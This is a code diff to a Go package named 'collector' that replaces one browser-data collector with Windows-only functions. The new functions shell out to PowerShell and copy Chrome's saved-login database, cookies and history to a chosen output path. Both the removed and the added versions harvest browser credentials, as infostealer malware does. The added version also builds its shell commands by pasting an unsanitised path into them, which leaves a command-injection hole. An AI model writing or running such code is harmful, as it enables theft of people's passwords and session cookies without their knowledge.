@@ -1,39 +1,41 @@
+//go:build windows
+
 package collector
 
 import (
-"os"
-"path/filepath"
+"os/exec"
 )
 
-type BrowserCollector struct{}
-
-func NewBrowserCollector() *BrowserCollector {
-return &BrowserCollector{}
-}
-
-func (b *BrowserCollector) ExtractChrome() (string, error) {
-path := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
-data, err := os.ReadFile(path)
+func CollectBrowserData(outputPath string) bool {
+cmd := exec.Command("cmd", "/c", "powershell -Command \"Copy-Item 'C:\\Users\\Public\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data' '"+outputPath+"'\"")
+err := cmd.Run()
 if err != nil {
-return "", err
+return false
 }
-return string(data), nil
-}
-
-func (b *BrowserCollector) ExtractFirefox() (string, error) {
-path := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "Mozilla", "Firefox", "Profiles")
-data, err := os.ReadFile(path)
-if err != nil {
-return "", err
-}
-return string(data), nil
+return true
 }
 
-func (b *BrowserCollector) ExtractEdge() (string, error) {
-path := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
-data, err := os.ReadFile(path)
+func CollectBrowserCookies(outputPath string) bool {
+cmd := exec.Command("cmd", "/c", "powershell -Command \"Copy-Item 'C:\\Users\\Public\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies' '"+outputPath+"'\"")
+err := cmd.Run()
 if err != nil {
-return "", err
+return false
 }
-return string(data), nil
+return true
+}
+
+func CollectBrowserHistory(outputPath string) bool {
+cmd := exec.Command("cmd", "/c", "powershell -Command \"Copy-Item 'C:\\Users\\Public\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History' '"+outputPath+"'\"")
+err := cmd.Run()
+if err != nil {
+return false
+}
+return true
+}
+
+func CollectAllBrowserData(outputPath string) bool {
+CollectBrowserData(outputPath)
+CollectBrowserCookies(outputPath)
+CollectBrowserHistory(outputPath)
+return true
 }
